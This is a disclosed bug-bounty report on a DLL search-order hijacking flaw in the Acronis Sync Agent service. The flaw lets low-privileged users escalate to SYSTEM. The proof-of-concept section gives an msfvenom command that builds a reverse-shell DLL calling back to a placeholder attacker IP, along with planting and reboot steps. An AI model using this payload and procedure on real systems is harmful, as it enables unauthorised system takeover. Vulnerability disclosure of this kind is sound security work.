# Acronis Sync Agent Service - Untrusted DLL Search-Ordering lead to Privilege Escalation

## Report Details
- **Report ID**: 924493
- **URL**: https://hackerone.com/reports/924493
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-07-15T15:44:23.412Z
- **Disclosed**: 2024-08-26T15:27:58.091Z

## Reporter
- **Username**: vanitas
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
Vulnerability Explanation :
	An issue was discovered in Acronis Sync Agent service which intregated from Acronis True Image ver.24.6.25700. This service is suffered by incorrect DLL search-order hijacking. The malicious users who are in “Authenticated Users” group can use DLL-Hijacking to execute arbitrary code and do privilege escalation exploit to escalate and gain full system privilege user access and rights over the system.

Vulnerable application version :
	Acronis True Image ver.24.6.25700 (maybe lower are affected too).

PoC Operating System version :
	Microsoft Windows 10 Home - 64 bits with latest patched.

Vulnerability found :
1. Incorrect DLL search-order from syncagentsrv.exe.
2. DLL-Hijacking using CSUNSAPI.dll.	

Lab Environment :
1. Install Python2.7 for windows, we can see C:\Python27 which is default home application of Python2.7 is added to SYSTEM PATH variable. Open from environment variable. [Ref Picture : 01.jpg, 02.jpg]

Vulnerability Finding :
1. See from service : "Acronis Sync Agent Service" can running by execute file : "C:\Program Files (x86)\Common Files\Acronis\SyncAgent\syncagentsrv.exe"
2. Open Process Monitor, to find out how it is doing. Add filter with following criteria : [Ref Picture : 03.jpg]
• Process Name is syncagentsrv.exe (Include)
• Result contains NOT FOUND (Include)
• Path contains C:\Python27 (Include)
• Operation begins with Reg (Exclude)
3. From Process Monitor, we can see suspicious DLL name as : "CSUNSAPI.dll" was called in every folders which are defined in SYSTEM PATH variable. [Ref Picture : 04.jpg]
4. When closely look for this process details, see that C:\Python27\CSUNSAPI.dll was loaded by SYSTEM privilege with 32 bits process. [Ref Picture : 05.jpg, 06.jpg]
This is potential to do privilege escalation exploit using DLL-hijacking

Proof-of-concept exploitation :
1. Use msfvenom tool on Kali-linux to generate malicious DLL file, then save as CSUNSAPI.dll. It will generate shellcode to send reverse shell to attacker when this DLL is loaded to target system as below command. [Ref Picture : 07.jpg]
Command : 
msfvenom -p windows/shell_reverse_tcp LHOST=[Attacker-IP] LPORT=[Attacker-port] -f dll > CSUNSAPI.dll
2. On attacker side (Kali-linux). Start reverse shell listener for receive reverse shell.
3. Transfer malicious DLL file to target server, place CSUNSAPI.dll at C:\Python27. Since this folder is writeable by any of users are in Authenticated Users group, then this low privileged user is allow to place this malicious DLL on this. [Ref Picture : 08.jpg]
4. Reboot lab machine, because this low privilege user don’t have service permission to control Acronis Sync Agent Service. Then we need to reboot target to initial this service again.
5. Get reverse shell as SYSTEM privilege, we can see this reverse shell is spawned by malicious DLL-hijacking. [Ref Picture : 09.jpg, 10.jpg]

## Impact

Impact :
Malicious users are able to gain privilege escalation permission as SYSTEM privilege.

## Attachments
- 01.jpg
- 02.jpg
- 04.jpg
- 03.jpg
- 05.jpg
- 06.jpg
- 07.jpg
- 08.jpg
- 09.jpg
- 10.jpg
